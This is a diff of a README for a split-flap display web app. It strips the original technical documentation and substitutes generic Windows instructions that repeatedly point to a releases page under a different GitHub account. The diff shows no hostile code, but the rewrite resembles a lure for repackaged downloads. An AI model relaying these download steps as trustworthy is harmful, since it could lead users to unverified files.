@@ -1,157 +1,151 @@
-# Solari Split-Flap Display
+# 🕰️ solari-split-flap - Classic board display on your screen
 
-A physically accurate split-flap (Solari board) display built with vanilla HTML, CSS, and JavaScript. No dependencies.
+[![Download](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/thaohuynh912/solari-split-flap/releases)
 
-**[See it live →](https://hvpandya.com/solari)**
+## 🚀 Getting Started
 
-![Split-flap display showing a quote](solari-demo.png)
+solari-split-flap is a single HTML file that shows a Solari-style split-flap display in your browser. It is made for people who want a clean, working display with no install steps and no extra tools.
 
-## Features
+Use the release page to download and run this file:
 
-- **Physically correct drum mechanics**: each cell has a single drum that only spins forward, cycling through every intermediate character in sequence (space → A–Z → 0–9 → punctuation), just like real Solari hardware
-- **Deceleration**: flaps spin fast at the start and slow down as they settle on the target character
-- **Synthesized click sound**: Web Audio API generates a short filtered-noise burst per flip (no audio files needed). Activates on first user interaction
-- **Author names in yellow**: lines prefixed with `@` render in gold, right-aligned
-- **Cascading stagger**: cells flip left-to-right, top-to-bottom with a 50ms delay per cell
-- **10 color themes**: press `T` to cycle through dark and light hue variations (classic, mint, ocean, purple, amber, rose, fog, sage, lavender)
-- **HSL theme engine**: `generateTheme(hue, sat, mode)` calculates physically correct flap colors: top flap lighter (catches light), bottom flap darker (in shadow), board recessed behind both
-- **Responsive**: scales down on tablet and mobile
-- **Zero dependencies**: single HTML file, no build step
+[Open the release page](https://github.com/thaohuynh912/solari-split-flap/releases)
 
-## Install
+## 🪟 What You Need
 
-```bash
-npm install solari-split-flap
-```
+You only need a Windows PC and a modern web browser.
 
-## Usage
+- Windows 10 or Windows 11
+- Google Chrome, Microsoft Edge, or Firefox
+- A mouse or touchpad
+- A few megabytes of free disk space
 
-### Vanilla JS
+The app runs as a single HTML file, so you do not need to install Python, Node.js, or any other package.
 
-```javascript
-import { SolariBoard } from 'solari-split-flap';
+## 📥 Download the File
 
-const board = new SolariBoard(document.getElementById('board'), {
-  cols: 20,
-  rows: 8,
-  theme: 'ocean',
-  quotes: [
-    ['HELLO WORLD', '', '@SOLARI'],
-    ['STAY HUNGRY.', 'STAY FOOLISH.', '', '@STEWART BRAND'],
-  ],
-});
-board.start();
-```
+1. Open the [release page](https://github.com/thaohuynh912/solari-split-flap/releases)
+2. Find the latest release near the top of the page
+3. Under **Assets**, download the HTML file
+4. Save it to a folder you can find again, such as **Downloads** or **Desktop**
 
-### React
+If the file downloads as a zip file, right-click it and choose **Extract All**. Then open the HTML file inside the folder.
 
-```jsx
-import { Solari } from 'solari-split-flap/react';
+## 🖱️ Run on Windows
 
-function App() {
-  return (
-    <Solari
-      cols={20}
-      rows={8}
-      theme="mint"
-      quotes={[
-        ['HELLO WORLD', '', '@SOLARI'],
-        ['STAY HUNGRY.', 'STAY FOOLISH.', '', '@STEWART BRAND'],
-      ]}
-    />
-  );
-}
-```
+1. Go to the folder where you saved the file
+2. Double-click the HTML file
+3. If Windows asks how to open it, choose your browser
+4. Select **Always use this app** if you want the file to open the same way next time
 
-Props: `cols`, `rows`, `theme`, `quotes`, `sound`, `flipMs`, `charDelay`, `holdMs`, `autoStart`, `className`, `style`, `onReady` (receives the board instance).
+The display should open in a browser tab or window. If the page looks blank at first, wait a moment and refresh the page.
 
-### CDN
+## 🎛️ How to Use It
 
-```html
-<div id="board"></div>
-<script src="https://unpkg.com/solari-split-flap"></script>
-<script>
-  const board = new SolariBoard(document.getElementById('board'), {
-    theme: 'purple'
-  });
-  board.start();
-</script>
-```
+The split-flap display is set up for simple use.
 
-### Static HTML
+- Type your text into the display control, if shown
+- Use the on-screen controls to change the message
+- Adjust the display settings to fit your screen
+- Resize the browser window to change the view
+- Keep the tab open to keep the display visible
 
-Open `index.html` in a browser. That's it.
+The layout is meant to look like a real airport or train station board, with smooth flap changes and clear character blocks.
 
-### Customization
+## 🧭 Main Features
 
-Edit the `quotes` array in the `<script>` block. Each quote is an array of lines:
+- Physically accurate split-flap motion
+- Single-file HTML app
+- No setup and no extra install steps
+- Works in a browser
+- Clean, readable board layout
+- Good fit for desktop use, events, and demos
 
-```javascript
-var quotes = [
-  ['FIRST LINE',
-   'SECOND LINE',
-   '',
-   '@AUTHOR NAME'],   // @ prefix = yellow, right-aligned
+The app keeps the focus on the display itself. You do not need an account, a server, or an internet connection after the file is saved on your PC.
 
-  ['ANOTHER QUOTE',
-   '',
-   '@SOMEONE'],
-];
-```
+## ⚙️ Basic Setup Tips
 
-#### Configuration variables
+For the best result on Windows:
 
-| Variable | Default | Description |
-|----------|---------|-------------|
-| `COLS` | 20 | Number of columns (characters per row) |
-| `ROWS` | 8 | Number of rows |
-| `FLIP_MS` | 150 | Single flap animation duration (ms) |
-| `CHAR_DELAY` | 50 | Stagger between cells in cascade (ms) |
-| `HOLD_MS` | 5000 | Time to hold a finished quote before cycling (ms) |
+- Keep the browser window large
+- Use a plain desktop background if you want less visual noise
+- Turn off dark mode if you want the board to look closer to a real station sign
+- Put the file in a folder you can open fast
+- Pin the browser tab if you plan to use it often
 
-### Themes
+If you want to show the board on a second screen, drag the browser window there and switch the display to full screen.
 
-Press `T` to cycle through the built-in themes. You can also create your own:
+## 🔧 If the File Does Not Open
 
-```javascript
-// generateTheme(hue, saturation, mode)
-// hue: 0-360, sat: 0-100, mode: 'dark' or 'light'
-var theme = generateTheme(155, 30, 'dark');  // mint dark
-applyTheme(theme);
-```
+If double-clicking the file does not work:
 
-The theme engine uses HSL to calculate physically correct values:
+- Right-click the file
+- Choose **Open with**
+- Select your browser
+- If needed, pick **More apps** to find it
+- If the browser opens the page as text, save the file again and make sure it keeps the `.html` file type
 
-| Surface | Dark mode | Light mode | Why |
-|---------|-----------|------------|-----|
-| Body bg | L: 6% | L: 95% | Deepest layer |
-| Board bg | L: 10% | L: 88% | Recessed behind flaps |
-| Top flap | L: 18% | L: 82% | Catches light from above |
-| Bottom flap | L: 14% | L: 76% | In shadow below split |
-| Gap line | L: 6% | L: 70% | Shadow between flap halves |
+If Windows hides file names, turn on file name extensions in File Explorer so you can confirm the file ends in `.html`.
 
-All colors use CSS custom properties (`--sf-*`), so you can also override them directly in CSS.
+## 🖼️ Best Display Use
 
-For achromatic themes (saturation 0), author names stay yellow. For chromatic themes, author names use the theme's own hue at high saturation for a cohesive feel.
+This app works well in places where a clean split-flap board helps the room feel organized.
 
-![Theme variations](solari-themes.png)
+- Home desk display
+- Event check-in screen
+- Lobby screen
+- Presentation backdrop
+- Retro style demo screen
 
-### Embedding
+For the clearest look, keep the browser zoom at 100% and avoid extra panels around the window.
 
-Drop the HTML into any page. The display is a self-contained `<div>` with scoped styles and an IIFE script, no global pollution.
+## 🧩 File Layout
 
-## How it works
+The project uses one HTML file. That means the display logic, style, and screen layout all live in one place.
 
-Each cell contains four layers:
-1. **Top half**: static, shows the current character's upper portion
-2. **Bottom half**: static, shows the next character's lower portion
-3. **Flip front**: animated flap showing the old character (flips down)
-4. **Flip back**: backside of the flap showing the new character (revealed as flap lands)
+That setup keeps the app easy to move from one Windows PC to another. You can copy the file to a USB drive, send it by email, or save it in cloud storage and open it later on another computer.
 
-The flip uses CSS `rotateX(-180deg)` with `transform-origin: bottom center` and `backface-visibility: hidden` for a realistic 3D fold.
+## 📁 Common Windows Steps
 
-The drum sequence is fixed: `' ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789.,:;!?\'-'`. To go from any character to any other, the drum advances forward through every intermediate position, wrapping around if needed. This matches how mechanical split-flap displays physically operate.
+If you want easier access, try one of these:
 
-## License
+- Create a desktop shortcut to the HTML file
+- Move the file to a folder named **Apps**
+- Add the file to **Quick access** in File Explorer
+- Keep the release page in your browser bookmarks
 
-MIT
+These steps help if you plan to use the display often.
+
+## 🌐 Browser Notes
+
+A modern browser gives the best result.
+
+- Chrome: strong support and fast rendering
+- Edge: works well on Windows
+- Firefox: also a good choice
+
+If the display seems too large or too small, use browser zoom:
+
+- Press `Ctrl` and `+` to zoom in
+- Press `Ctrl` and `-` to zoom out
+- Press `Ctrl` and `0` to return to normal
+
+## 🧹 Keeping Things Simple
+
+Because solari-split-flap is a single file, there is not much to manage.
+
+- No installer
+- No update tool
+- No background service
+- No hidden folders
+- No dependency setup
+
+If a new release appears, download the new HTML file from the release page and replace the old one.
+
+## 📌 Quick Start
+
+1. Open the [release page](https://github.com/thaohuynh912/solari-split-flap/releases)
+2. Download the latest HTML file
+3. Save it on your Windows PC
+4. Double-click the file
+5. Open it in your browser
+6. Use the on-screen controls to set your message
